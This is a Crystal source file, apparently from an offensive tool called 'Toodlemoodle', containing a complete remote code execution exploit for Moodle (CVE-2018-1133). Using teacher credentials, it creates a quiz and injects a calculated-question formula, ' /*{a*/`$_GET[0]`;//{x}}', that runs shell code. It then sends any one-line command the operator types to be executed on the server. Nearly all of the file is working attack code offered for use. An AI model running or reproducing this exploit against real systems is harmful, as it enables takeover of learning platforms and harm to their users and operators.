# TODO: Write documentation for `Toodlemoodle`
# CVE-2018-1133 link: https://www.exploit-db.com/exploits/46551
# NVD vuln page: https://nvd.nist.gov/vuln/detail/CVE-2018-1133
# Security researcher page: https://blog.ripstech.com/2018/moodle-remote-code-execution/
# Docker image: https://hub.docker.com/r/jhardison/moodle/dockerfile
# Payload

require "http/client"
require "option_parser"
require "json"
require "base64"
require "./*"
require "file"

module TMoodleActions
  class RCEExploit
    @@session = {"moodle_session" => "", "session_key" => ""}
    @@context = ""
    @@question_id = ""
    def perform(target)
      puts "[*] Welcome to the Moodle RCE tool!"
      puts "[?] Enter the teacher username"
      username = gets().not_nil!
      puts "[?] Enter the teacher password"
      psw = gets().not_nil!
      sess_info = SessionInfo.new
      @@session = sess_info.get_session(target, username, psw)
      puts "[?] Enter the course ID"
      course_id = gets().not_nil!
      load_course(target, course_id)
      quiz_id = add_quiz(target, course_id).not_nil!
      add_calculated_question(target, course_id, quiz_id)
      add_evil_question(target, course_id, quiz_id)
      execute_payload(target, quiz_id)
    end

    def load_course(url, id)
      puts "[>] Loading the course page..."
      result = http_get(url + "/course/view.php?id=" + id + "&sesskey=" + @@session["session_key"] + "&edit=on", @@session["moodle_session"])
      if m = result.body.match(/.view.php\?id=2&amp;notifyeditingon=1/)
        puts "[*] Course page loaded and in edit mode!"
      else
        puts "[!] Failed loading course!"
        exit 1
      end
    end

    def add_quiz(url, course_id)
      puts "[>] Creating an evil quiz..."
      data = {
        "course"  => course_id,
        "sesskey" => @@session["session_key"],
        "jump"    => url + "/course/mod.php?id=" + course_id + "&sesskey=" + @@session["session_key"] + "&sr=0&add=quiz&section=0",
      }
      result = http_post(url + "/course/jumpto.php", data, @@session["moodle_session"])
      if result.status_code == 303
        puts "[>] Configuring the evil quiz..."
        submit = {
          "grade"                                            => "10",
          "boundary_repeats"                                 => "1",
          "completionunlocked"                               => "1",
          "course"                                           => course_id,
          "coursemodule"                                     => "",
          "section"                                          => "0",
          "module"                                           => "16",
          "modulename"                                       => "quiz",
          "instance"                                         => "",
          "add"                                              => "quiz",
          "update"                                           => "0",
          "return"                                           => "0",
          "sr"                                               => "0",
          "sesskey"                                          => @@session["session_key"],
          "_qf__mod_quiz_mod_form"                           => "1",
          "mform_showmore_id_layouthdr"                      => "0",
          "mform_showmore_id_interactionhdr"                 => "0",
          "mform_showmore_id_display"                        => "0",
          "mform_showmore_id_security"                       => "0",
          "mform_isexpanded_id_general"                      => "1",
          "mform_isexpanded_id_timing"                       => "0",
          "mform_isexpanded_id_modstandardgrade"             => "0",
          "mform_isexpanded_id_layouthdr"                    => "0",
          "mform_isexpanded_id_interactionhdr"               => "0",
          "mform_isexpanded_id_reviewoptionshdr"             => "0",
          "mform_isexpanded_id_display"                      => "0",
          "mform_isexpanded_id_security"                     => "0",
          "mform_isexpanded_id_overallfeedbackhdr"           => "0",
          "mform_isexpanded_id_modstandardelshdr"            => "0",
          "mform_isexpanded_id_availabilityconditionsheader" => "0",
          "mform_isexpanded_id_activitycompletionheader"     => "0",
          "mform_isexpanded_id_tagshdr"                      => "0",
          "mform_isexpanded_id_competenciessection"          => "0",
          "name"                                             => "xxxx",
          "introeditor[text]"                                => "<p>xxxx<br></p>",
          "introeditor[format]"                              => "1",
          "introeditor[itemid]"                              => "966459952",
          "showdescription"                                  => "0",
          "overduehandling"                                  => "autosubmit",
          "gradecat"                                         => "1",
          "gradepass"                                        => "",
          "attempts"                                         => "0",
          "grademethod"                                      => "1",
          "questionsperpage"                                 => "1",
          "navmethod"                                        => "free",
          "shuffleanswers"                                   => "1",
          "preferredbehaviour"                               => "deferredfeedback",
          "attemptonlast"                                    => "0",
          "attemptimmediately"                               => "1",
          "correctnessimmediately"                           => "1",
          "marksimmediately"                                 => "1",
          "specificfeedbackimmediately"                      => "1",
          "generalfeedbackimmediately"                       => "1",
          "rightanswerimmediately"                           => "1",
          "overallfeedbackimmediately"                       => "1",
          "attemptopen"                                      => "1",
          "correctnessopen"                                  => "1",
          "marksopen"                                        => "1",
          "specificfeedbackopen"                             => "1",
          "generalfeedbackopen"                              => "1",
          "rightansweropen"                                  => "1",
          "overallfeedbackopen"                              => "1",
          "showuserpicture"                                  => "0",
          "decimalpoints"                                    => "2",
          "questiondecimalpoints"                            => "-1",
          "showblocks"                                       => "0",
          "quizpassword"                                     => "",
          "subnet"                                           => "",
          "browsersecurity"                                  => "-",
          "feedbacktext[0][text]"                            => "",
          "feedbacktext[0][format]"                          => "1",
          "feedbacktext[0][itemid]"                          => "754687559",
          "feedbackboundaries[0]"                            => "",
          "feedbacktext[1][text]"                            => "",
          "feedbacktext[1][format]"                          => "1",
          "feedbacktext[1][itemid]"                          => "88204176",
          "visible"                                          => "1",
          "cmidnumber"                                       => "",
          "groupmode"                                        => "0",
          "availabilityconditionsjson"                       => "{\"op\":\"&\",\"c\":[],\"showc\":[]}",
          "completion"                                       => "1",
          "tags"                                             => "_qf__force_multiselect_submission",
          "competency_rule"                                  => "0",
          "submitbutton"                                     => "Save and display",
        }
        submit_result = http_post(url + "/course/modedit.php", submit, @@session["moodle_session"])
        if submit_result.status_code == 303
          puts "[*] Evil quiz created and configured!"
          return (/quiz\/view.php.id=([0-9]*)\"/.match(submit_result.headers.to_s).try &.[1])
        else
          puts "[!] Failed configuring the evil quiz!"
          exit 1
        end
      else
        puts "[!] Failed creating the evil quiz!"
        exit 1
      end
    end

    def get_context(body)
      puts "[>] Retrieving context..."
      if m = (/<optgroup[\s]?label="Course:[\s]?[a-zA-Z]+">[\n\r][\s]*<option[\s]?value="[0-9],([0-9]{2})"[\s]*>Top/).match(body)
        @@context = m[1]
        puts "[*] Context retrieved successfully!"
      else
        puts "[!] Failed retrieving context!"
        exit 1
      end
    end

    def add_calculated_question(url, course_id, quiz_id)
      puts "[>] Editing evil quiz..."
      result_edit = http_get(url + "/mod/quiz/edit.php?cmid=" + quiz_id.not_nil!, @@session["moodle_session"])
      if a = result_edit.body.match(/Editing quiz: xxxx/)
        puts "[>] Evil quiz in edit mode..."
        get_context(result_edit.body)
        puts "[>] Adding calculated question..."
        calc_question_url = "/question/question.php?courseid=" + course_id + "&sesskey=" + @@session["session_key"] + "&qtype=calculated&returnurl=/mod/quiz/edit.php?cmid=" + quiz_id.not_nil! + "&addonpage=0&cmid=" + quiz_id.not_nil! + "&category=2&addonpage=0&appendqnumstring=addquestion"
        result_calc = http_get(url + calc_question_url, @@session["moodle_session"])
        if b = result_calc.body.match(/Adding a Calculated question/)
          puts "[*] Calculated question added!"
        else
          puts "[!] Failed adding calculated question!"
          exit 1
        end
      else
        puts result_edit.headers.to_s
        puts "[!] Failed editing evil quiz!"
        exit 1
      end
    end

    def add_evil_question(url, course_id, quiz_id)
      puts "[>] Adding evil question..."
      payload = {
        "initialcategory"                      => "1",
        "reload"                               => "1",
        "shuffleanswers"                       => "1",
        "answernumbering"                      => "abc",
        "mform_isexpanded_id_answerhdr"        => "1",
        "noanswers"                            => "1",
        "nounits"                              => "1",
        "numhints"                             => "2",
        "synchronize"                          => "0",
        "wizard"                               => "datasetdefinitions",
        "id"                                   => "",
        "inpopup"                              => "0",
        "cmid"                                 => quiz_id,
        "courseid"                             => course_id,
        "returnurl"                            => "/mod/quiz/edit.php?cmid=" + quiz_id + "&addonpage=0",
        "scrollpos"                            => "0",
        "appendqnumstring"                     => "addquestion",
        "qtype"                                => "calculated",
        "makecopy"                             => "0",
        "sesskey"                              => @@session["session_key"],
        "_qf__qtype_calculated_edit_form"      => "1",
        "mform_isexpanded_id_generalheader"    => "1",
        "mform_isexpanded_id_unithandling"     => "0",
        "mform_isexpanded_id_unithdr"          => "0",
        "mform_isexpanded_id_multitriesheader" => "0",
        "mform_isexpanded_id_tagsheader"       => "0",
        "category"                             => "2,"+@@context,
        "name"                                 => "zzzz",
        "questiontext[text]"                   => "<p>zzzz<br></p>",
        "questiontext[format]"                 => "1",
        "questiontext[itemid]"                 => "999787569",
        "defaultmark"                          => "1",
        "generalfeedback[text]"                => "",
        "generalfeedback[format]"              => "1",
        "generalfeedback[itemid]"              => "729029157",
        "answer[0]"                            => " /*{a*/\`$_GET[0]\`;//{x}}",
        "fraction[0]"                          => "1.0",
        "tolerance[0]"                         => "0.01",
        "tolerancetype[0]"                     => "1",
        "correctanswerlength[0]"               => "2",
        "correctanswerformat[0]"               => "1",
        "feedback[0][text]"                    => "",
        "feedback[0][format]"                  => "1",
        "feedback[0][itemid]"                  => "928615051",
        "unitrole"                             => "3",
        "penalty"                              => "0.3333333",
        "hint[0]text]"                         => "",
        "hint[0]format]"                       => "1",
        "hint[0]itemid]"                       => "583108469",
        "hint[1]text]"                         => "",
        "hint[1]format]"                       => "1",
        "hint[1]itemid]"                       => "654054189",
        "tags"                                 => "_qf__force_multiselect_submission",
        "submitbutton"                         => "Save+changes",
      }
      response = http_post(url + "/question/question.php", payload, @@session["moodle_session"])
      if c = response.body.match(/This page should automatically redirect./)
        puts "[*] Evil question added!"
        get_question_id(response.body)
      else
        puts "[!] Failed adding evil question!"
        exit 1
      end
    end

    def get_question_id(body)
      puts "[>] Retrieving question ID..."
      if m = (/&amp;id=([0-9]+)/).match(body)
        @@question_id = m[1]
        puts "[*] Question ID retrieved successfully!"
      else
        puts "[!] Failed retrieving question ID!"
        exit 1
      end
    end

    def execute_payload(url, quiz_id)
      puts "[?] Type in the payload you want to be executed on the server, ONE LINE ONLY!"
      payload = gets().not_nil!
      puts "[>] Executing payload!"
      exploit_url = "/question/question.php?returnurl=" + URI.escape("/mod/quiz/edit.php?cmid=" + quiz_id) + "&addonpage=0&appendqnumstring=addquestion&scrollpos=0&id="+@@question_id+"&wizardnow=datasetitems&cmid=" + quiz_id + "&0=(" + URI.escape(payload) + ")"
      result = http_get(url + exploit_url, @@session["moodle_session"])
      puts "[***] Payload EXECUTED ON SERVER!"
    end

    private def http_post(url, data : String | Hash(String, String | Int32), moodle_session = "", json = nil)
      headers = HTTP::Headers.new
      if moodle_session != ""
        headers.add("Cookie", "MoodleSession=" + moodle_session)
      end
      if json
        headers.add("Content-Type", "application/json")
      end

      return HTTP::Client.post(url, headers: headers, form: data)
    end

    private def http_get(url, moodle_session)
      headers = HTTP::Headers.new
      headers.add("Cookie", "MoodleSession=" + moodle_session.to_s)
      return HTTP::Client.get(url, headers: headers)
    end
  end
end
